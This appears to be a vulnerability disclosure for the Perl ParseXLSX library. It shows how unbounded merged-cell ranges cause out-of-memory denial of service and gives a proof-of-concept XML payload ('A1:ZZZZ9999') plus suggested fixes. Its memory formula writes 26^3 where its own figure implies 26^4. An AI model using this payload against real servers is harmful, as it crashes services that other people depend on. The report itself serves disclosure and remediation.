# ParseXLSX security vulnerbilities

> TL;DR: memory utilization go brrrr

## DoS via out-of-memory bugs

### Analysis

ParseXLSX also handles with merged cells, but the memoize implementation allows attacker to allocate an arbitrary memory size.

```perl
# ParseXLSX.pm
sub _parse_sheet {
    my $sheet_xml = $self->_new_twig(
        twig_roots => {
            #...
            's:mergeCells/s:mergeCell' => sub {
                my ( $twig, $merge_area ) = @_;

                if (my $ref = $merge_area->att('ref')) {
                    my ($topleft, $bottomright) = $ref =~ /([^:]+):([^:]+)/;

                    # Parse cell coordinates to numeric
                    my ($toprow, $leftcol)     = $self->_cell_to_row_col($topleft);
                    my ($bottomrow, $rightcol) = $self->_cell_to_row_col($bottomright);

                    push @{ $sheet->{MergedArea} }, [
                        $toprow, $leftcol,
                        $bottomrow, $rightcol,
                    ];
                    
                    # Saves merged state for each cell in the merged cell
                    for my $row ($toprow .. $bottomrow) {
                        for my $col ($leftcol .. $rightcol) {
                            $merged_cells{"$row;$col"} = 1;
                        }
                    }
                }

                $twig->purge;
            },
        }
    )
}

sub _cell_to_row_col {
    my $self = shift;
    my ($cell) = @_;

    my ($col, $row) = $cell =~ /([A-Z]+)([0-9]+)/;

    my $ncol = 0;
    for my $char (split //, $col) {
        $ncol *= 26;
        $ncol += ord($char) - ord('A') + 1;
    }
    $ncol = $ncol - 1;

    my $nrow = $row - 1;

    return ($nrow, $ncol);
}
```

Because the size of a merged cell doesn't have any constraints, this can make the program allocates huge amount of memory, exhausts swap memory and crashes the server.

### Final POC
In `xl/worksheets/sheet1.xml`, add
```xml
  <mergeCells count="1">
    <mergeCell ref="A1:ZZZZ9999"/>
  </mergeCells>
```
inside `<worksheet>` tag, or modify `ref` attribute of any existing `<mergeCell>` tag.

This would make the program allocates at least $26^3 . 10^4 \approx 4.5 . 10^9$ bytes just for handling merged cells.

### Mitigation
I think that this vulnerability can be fixed in either 2 ways:
- Set a limit in range inside `_cell_to_row_col` subroutine
- Use a different method to handle merged cells, instead of preemptively marking like the current solution.
